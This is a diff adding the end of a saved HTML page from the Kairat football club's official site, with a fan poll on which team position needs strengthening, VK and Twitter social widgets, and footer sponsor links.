+	<div id="vote_title">Какую позицию в команде следует усилить? <img src="./Официальный Сайт ФК_Кайрат__files/voteri.png" width="7"></div>
+	<form id="voter_form" action="http://www.fckairat.kz/main/vote/id/41" method="POST">
+		<ul id="variants">
+							<li>
+					 
+						<input id="check_186" type="radio" name="vote" value="186"> 
+										<label for="check_186">- Нужны защитники</label>
+				</li> 
+							<li>
+					 
+						<input id="check_187" type="radio" name="vote" value="187"> 
+										<label for="check_187">- Нужны полузащитники </label>
+				</li> 
+							<li>
+					 
+						<input id="check_188" type="radio" name="vote" value="188"> 
+										<label for="check_188">- Нужны нападающие</label>
+				</li> 
+							<li>
+					 
+						<input id="check_189" type="radio" name="vote" value="189"> 
+										<label for="check_189">У нас идеальный состав</label>
+				</li> 
+					</ul>
+		<input type="submit" value="Голосовать" id="vote_link">
+	</form>
+
+	</div>
+</div>
+                    </div>
+                    <div class="bl3" style="margin-top:20px; height:333px; width: 315px;">
+                                                    <!-- VK Widget -->
+<div id="vk_groups" style="height: 330px; width: 313px; background: none;"><iframe name="fXD9caf7" frameborder="0" src="./Официальный Сайт ФК_Кайрат__files/widget_community.html" width="313" height="200" scrolling="no" id="vkwidget1" style="overflow: hidden; height: 330px;"></iframe></div>
+    <script type="text/javascript">
+    VK.Widgets.Group("vk_groups", {mode: 0, width: "313", height: "330", color1: 'FFFFFF', color2: '2B587A', color3: '5B7FA6'}, 24225920);
+    </script>
+                    </div>
+                    <div class="bl3" style="height:333px;">
+                    <iframe id="twitter-widget-0" scrolling="no" frameborder="0" allowtransparency="true" allowfullscreen="true" class="twitter-timeline twitter-timeline-rendered" style="position: static; visibility: visible; display: inline-block; width: 520px; height: 330px; padding: 0px; border: none; max-width: 100%; min-width: 180px; margin-top: 0px; margin-bottom: 0px; min-height: 200px;" data-widget-id="439782982656598018" src="./Официальный Сайт ФК_Кайрат__files/saved_resource.html"></iframe>
+    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+                    </div>
+                </div>
+<div class="block4">
+                <div class="text1">При использовании материалов сайта ссылка на источник обязательна</div>
+                <div class="text2">© 2014 «Кайрат», Футбольный клуб</div>
+                <div class="CKM" style="margin-left: 800px; margin-top: 0px;"> <a href="http://skm.kz/"><img src="./Официальный Сайт ФК_Кайрат__files/293x200.gif" width="200" height="70"></a> </div>
+                <div class="CKM" style="margin-left: 600px; margin-top: -75px;"> <a href="http://tender.sk.kz/"><img src="./Официальный Сайт ФК_Кайрат__files/tender_sk.jpg" width="200" height="70"></a> </div>
+                <div class="CKM" style="margin-left: 400px; margin-top: -75px;"> <a href="http://enstru.skc.kz/"><img src="./Официальный Сайт ФК_Кайрат__files/enstru_sk.jpg" width="200" height="70"></a> </div>
+            </div>
+    </div>
+            </div>
+        </div>
+</div>
+
+
+<div id="ticketonWidgetOverlay"></div><div id="ticketonWidgetWrapper" style="top: 300px;"><div id="ticketonWidgetContainer" style="top: 297px;"></div></div><iframe src="./Официальный Сайт ФК_Кайрат__files/li.html" name="li" width="1" height="1" scrolling="no" frameborder="0"></iframe><style>.yap-item, .yap-nitem {opacity: 0}.yap-nitem.yap-item-visible {opacity: 1;transition: 200ms}</style><style>a[href="https://direct.yandex.ru/?partner"] {opacity: 0}</style><iframe id="rufous-sandbox" scrolling="no" frameborder="0" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: none;" src="./Официальный Сайт ФК_Кайрат__files/saved_resource(1).html"></iframe></body></html>
